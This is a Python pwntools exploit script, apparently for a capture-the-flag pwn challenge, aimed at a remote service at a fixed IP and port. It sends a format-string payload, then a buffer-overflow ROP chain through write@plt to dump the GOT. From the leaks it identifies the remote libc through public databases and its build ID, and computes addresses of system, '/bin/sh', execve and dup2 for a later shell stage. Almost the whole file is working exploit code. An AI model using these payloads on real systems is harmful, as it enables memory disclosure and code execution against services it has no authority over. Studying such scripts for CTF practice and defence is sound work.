from pwn import *
import time
import json

context(arch='i386', os='linux', log_level='info')

elf = ELF('d:/iscc/pwn2/pwn_permission')

HOST = '39.96.193.120'
PORT = 10000

target_val_addr = 0x804c030
write_plt = elf.plt['write']
vuln_addr = elf.symbols['vuln']

GOT_START = 0x0804c00c
GOT_SIZE = 0x1c

GOT_MAP = {
    0x0804c00c: 'read',
    0x0804c010: 'printf',
    0x0804c014: 'puts',
    0x0804c018: '__libc_start_main',
    0x0804c01c: 'write',
    0x0804c020: 'setvbuf',
    0x0804c024: 'memset',
}

def main():
    print("=" * 70)
    print("ACCURATE LIBC VERSION IDENTIFICATION")
    print("=" * 70)
    
    print("\n[1] Connecting and dumping GOT table in one shot...")
    conn = remote(HOST, PORT)
    data = conn.recv(timeout=5)
    log.info(f"Banner: {data[:80]}")
    
    fmt_payload = b'%5c%6$na' + p32(target_val_addr)
    conn.send(fmt_payload)
    time.sleep(2)
    
    response = conn.recv(timeout=5)
    if b'Input' not in response:
        log.warning("vuln not triggered!")
        conn.close()
        return
    
    log.success("vuln triggered!")
    
    payload = b'A' * 148
    payload += p32(write_plt)
    payload += p32(vuln_addr)
    payload += p32(1)
    payload += p32(GOT_START)
    payload += p32(GOT_SIZE)
    
    conn.send(payload)
    time.sleep(2)
    
    try:
        response = conn.recv(timeout=5)
    except EOFError:
        log.warning("Connection closed after GOT dump")
        conn.close()
        return
    
    log.info(f"Received {len(response)} bytes from GOT dump")
    log.info(f"Raw hex: {response[:40].hex()}")
    
    leaked = {}
    
    for got_addr, func_name in GOT_MAP.items():
        offset = got_addr - GOT_START
        if offset + 4 <= len(response):
            value = u32(response[offset:offset+4])
            if 0xf7000000 < value < 0xf7ffffff:
                leaked[func_name] = value
                low12 = value & 0xfff
                log.success(f"{func_name}: 0x{value:08x} (low12: 0x{low12:03x})")
            else:
                log.warning(f"{func_name}: 0x{value:08x} (not a typical libc address)")
        else:
            log.warning(f"{func_name}: offset {offset} out of range (response len={len(response)})")
    
    if len(leaked) < 2:
        log.warning("Not enough valid addresses leaked!")
        conn.close()
        return
    
    print("\n" + "=" * 70)
    print("LEAKED ADDRESSES (all from SAME connection):")
    print("=" * 70)
    for name, addr in sorted(leaked.items(), key=lambda x: x[1]):
        low12 = addr & 0xfff
        print(f"  {name:25s} = 0x{addr:08x}  (low12: 0x{low12:03x})")
    
    print("\n" + "=" * 70)
    print("OFFSET DIFFERENCES (ASLR-independent, from SAME connection):")
    print("=" * 70)
    if 'puts' in leaked:
        for name, addr in sorted(leaked.items(), key=lambda x: x[1]):
            if name != 'puts':
                diff = addr - leaked['puts']
                print(f"  {name} - puts = 0x{diff:x} ({diff})")
    
    print("\n[2] Querying libc databases...")
    
    try:
        import requests
    except ImportError:
        log.warning("requests not installed")
        conn.close()
        return
    
    symbols_dict = {}
    for func_name, addr in leaked.items():
        symbols_dict[func_name] = hex(addr & 0xfff)
    
    print(f"Query symbols: {json.dumps(symbols_dict)}")
    
    db_results = []
    
    for db_name, db_url in [("libc.rip", "https://libc.rip/api/find"), ("libc.blukat.me", "https://libc.blukat.me/api/find")]:
        try:
            print(f"\n>>> Querying {db_name}...")
            resp = requests.post(db_url, json={"symbols": symbols_dict}, timeout=20)
            if resp.status_code == 200:
                results = resp.json()
                if results:
                    print(f"    Found {len(results)} match(es)!")
                    db_results.extend(results)
                else:
                    print(f"    No matches")
            else:
                print(f"    Status: {resp.status_code}")
        except Exception as e:
            print(f"    Error: {e}")
    
    verified_matches = []
    for result in db_results:
        symbols = result.get('symbols', {})
        
        all_ok = True
        func_list = list(leaked.keys())
        for i in range(len(func_list)):
            for j in range(i+1, len(func_list)):
                f1, f2 = func_list[i], func_list[j]
                if f1 in symbols and f2 in symbols:
                    try:
                        off1 = int(symbols[f1], 16)
                        off2 = int(symbols[f2], 16)
                        expected_diff = off2 - off1
                        actual_diff = leaked[f2] - leaked[f1]
                        if expected_diff != actual_diff:
                            all_ok = False
                            print(f"  MISMATCH {result.get('id','?')}: {f2}-{f1} expected=0x{expected_diff:x} actual=0x{actual_diff:x}")
                    except:
                        pass
        
        if all_ok:
            verified_matches.append(result)
    
    if not verified_matches:
        print("\nNo verified matches! Printing all raw results for manual analysis:")
        for i, r in enumerate(db_results):
            lib_id = r.get('id', 'N/A')
            buildid = r.get('buildid', 'N/A')
            symbols = r.get('symbols', {})
            print(f"\n  [{i+1}] {lib_id}")
            print(f"      Build ID: {buildid}")
            for s in ['system', 'str_bin_sh', 'execve', 'puts', 'printf', 'write', 'read', '__libc_start_main']:
                if s in symbols:
                    print(f"      {s}: {symbols[s]}")
        
        print("\nManual offset analysis:")
        if 'puts' in leaked and 'printf' in leaked:
            printf_puts_diff = leaked['printf'] - leaked['puts']
            print(f"  printf - puts = 0x{printf_puts_diff:x}")
            
            known_diffs = {
                -0x1d4b0: "libc6-i386_2.31-0ubuntu9.x (2.31 i386)",
                -0x194b0: "UNKNOWN - different libc version?",
            }
            if printf_puts_diff in known_diffs:
                print(f"  -> Matches: {known_diffs[printf_puts_diff]}")
            else:
                print(f"  -> No known match for this difference")
        
        conn.close()
        return
    
    print(f"\n[3] Found {len(verified_matches)} verified match(es)!")
    
    for i, match in enumerate(verified_matches):
        lib_id = match.get('id', 'N/A')
        buildid = match.get('buildid', 'N/A')
        symbols = match.get('symbols', {})
        
        print(f"\n  [{i+1}] {lib_id}")
        print(f"      Build ID: {buildid}")
        
        if 'puts' in leaked and 'puts' in symbols:
            puts_offset = int(symbols['puts'], 16)
            libc_base = leaked['puts'] - puts_offset
            print(f"      libc_base = 0x{libc_base:x}")
            
            for sym in ['system', 'str_bin_sh', 'execve', 'dup2']:
                if sym in symbols:
                    off = int(symbols[sym], 16)
                    print(f"      {sym}: offset=0x{off:x}, addr=0x{libc_base+off:x}")
    
    best_match = verified_matches[0]
    best_symbols = best_match.get('symbols', {})
    puts_offset = int(best_symbols['puts'], 16)
    libc_base = leaked['puts'] - puts_offset
    
    print(f"\n[4] Attempting to read Build ID from remote libc at 0x{libc_base:x}...")
    
    time.sleep(0.5)
    try:
        conn.recv(timeout=1)
    except:
        pass
    
    payload = b'A' * 148
    payload += p32(write_plt)
    payload += p32(vuln_addr)
    payload += p32(1)
    payload += p32(libc_base)
    payload += p32(64)
    
    conn.send(payload)
    time.sleep(1.5)
    
    try:
        header_resp = conn.recv(timeout=3)
    except EOFError:
        log.warning("Connection lost reading ELF header")
        header_resp = b''
    
    elf_magic_found = False
    for i in range(len(header_resp) - 3):
        if u32(header_resp[i:i+4]) == 0x464c457f:
            elf_magic_found = True
            header_data = header_resp[i:]
            log.success(f"Found ELF header at offset {i} in response ({len(header_data)} bytes)")
            break
    
    build_id = None
    
    if elf_magic_found and len(header_data) >= 52:
        e_phoff = u32(header_data[28:32])
        e_phentsize = u16(header_data[42:44])
        e_phnum = u16(header_data[44:46])
        log.info(f"Program headers: offset=0x{e_phoff:x}, entsize={e_phentsize}, num={e_phnum}")
        
        time.sleep(0.5)
        try:
            conn.recv(timeout=1)
        except:
            pass
        
        ph_addr = libc_base + e_phoff
        payload = b'A' * 148
        payload += p32(write_plt)
        payload += p32(vuln_addr)
        payload += p32(1)
        payload += p32(ph_addr)
        payload += p32(e_phentsize * min(e_phnum, 8))
        
        conn.send(payload)
        time.sleep(1.5)
        
        try:
            ph_resp = conn.recv(timeout=3)
        except EOFError:
            ph_resp = b''
        
        note_file_offset = None
        note_file_size = None
        
        for i in range(min(e_phnum, 8)):
            off = i * e_phentsize
            if off + e_phentsize > len(ph_resp):
                break
            
            p_type = u32(ph_resp[off:off+4])
            p_offset_val = u32(ph_resp[off+4:off+8])
            p_filesz = u32(ph_resp[off+16:off+20])
            
            if p_type == 4:
                note_file_offset = p_offset_val
                note_file_size = p_filesz
                log.info(f"PT_NOTE: file_offset=0x{note_file_offset:x}, size=0x{note_file_size:x}")
                break
        
        if note_file_offset is not None:
            time.sleep(0.5)
            try:
                conn.recv(timeout=1)
            except:
                pass
            
            note_addr = libc_base + note_file_offset
            read_size = min(note_file_size, 256)
            
            payload = b'A' * 148
            payload += p32(write_plt)
            payload += p32(vuln_addr)
            payload += p32(1)
            payload += p32(note_addr)
            payload += p32(read_size)
            
            conn.send(payload)
            time.sleep(1.5)
            
            try:
                note_resp = conn.recv(timeout=3)
            except EOFError:
                note_resp = b''
            
            pos = 0
            while pos + 12 <= len(note_resp):
                try:
                    namesz = u32(note_resp[pos:pos+4])
                    descsz = u32(note_resp[pos+4:pos+8])
                    n_type = u32(note_resp[pos+8:pos+12])
                except:
                    break
                
                if n_type == 3 and namesz == 4 and descsz == 20:
                    name_aligned = (namesz + 3) & ~3
                    desc_start = pos + 12 + name_aligned
                    
                    if desc_start + descsz <= len(note_resp):
                        build_id = note_resp[desc_start:desc_start+descsz].hex()
                        log.success(f"BUILD ID: {build_id}")
                        break
                
                name_aligned = (namesz + 3) & ~3
                desc_aligned = (descsz + 3) & ~3
                pos += 12 + name_aligned + desc_aligned
            
            if not build_id:
                log.warning("NT_GNU_BUILD_ID not found in PT_NOTE")
                log.info(f"Raw PT_NOTE: {note_resp[:64].hex()}")
        else:
            log.warning("No PT_NOTE segment found")
    else:
        log.warning("Could not read ELF header from remote libc")
    
    if build_id:
        print(f"\n  Remote Build ID: {build_id}")
        
        exact_match = None
        for match in verified_matches:
            if match.get('buildid', '') == build_id:
                exact_match = match
                break
        
        if exact_match:
            print(f"\n  *** EXACT MATCH: {exact_match.get('id', 'N/A')} ***")
            best_match = exact_match
            best_symbols = exact_match.get('symbols', {})
            puts_offset = int(best_symbols['puts'], 16)
            libc_base = leaked['puts'] - puts_offset
        else:
            print(f"\n  Build ID does not exactly match any database entry.")
            print(f"  Database entries have different build IDs but same offsets.")
            print(f"  This means they are the same libc with same code but different build metadata.")
            for match in verified_matches:
                print(f"    Candidate: {match.get('id', 'N/A')} (buildid: {match.get('buildid', 'N/A')[:20]}...)")
    
    symbols = best_match.get('symbols', {})
    puts_offset = int(symbols['puts'], 16)
    libc_base = leaked['puts'] - puts_offset
    
    print("\n" + "=" * 70)
    print("FINAL CONFIRMED LIBC INFO:")
    print("=" * 70)
    print(f"  ID: {best_match.get('id', 'N/A')}")
    print(f"  Database Build ID: {best_match.get('buildid', 'N/A')}")
    if build_id:
        print(f"  Remote Build ID:   {build_id}")
    print(f"  libc_base: 0x{libc_base:x}")
    print(f"\n  Key offsets and calculated addresses:")
    
    final_info = {
        'libc_id': best_match.get('id', 'N/A'),
        'buildid': best_match.get('buildid', 'N/A'),
        'remote_buildid': build_id,
        'libc_base': hex(libc_base),
        'leaked': {k: hex(v) for k, v in leaked.items()},
        'offsets': {},
        'addresses': {}
    }
    
    for sym_name in ['system', 'str_bin_sh', 'execve', 'dup2', 'open',
                     'puts', 'printf', 'write', 'read', '__libc_start_main',
                     'setvbuf', 'memset']:
        if sym_name in symbols:
            offset = int(symbols[sym_name], 16)
            addr = libc_base + offset
            print(f"    {sym_name:25s} offset=0x{offset:08x}  addr=0x{addr:08x}")
            final_info['offsets'][sym_name] = hex(offset)
            final_info['addresses'][sym_name] = hex(addr)
    
    with open('d:/iscc/pwn2/libc_info.json', 'w') as f:
        json.dump(final_info, f, indent=2)
    
    log.success("libc info saved to libc_info.json")
    
    conn.close()

if __name__ == '__main__':
    main()
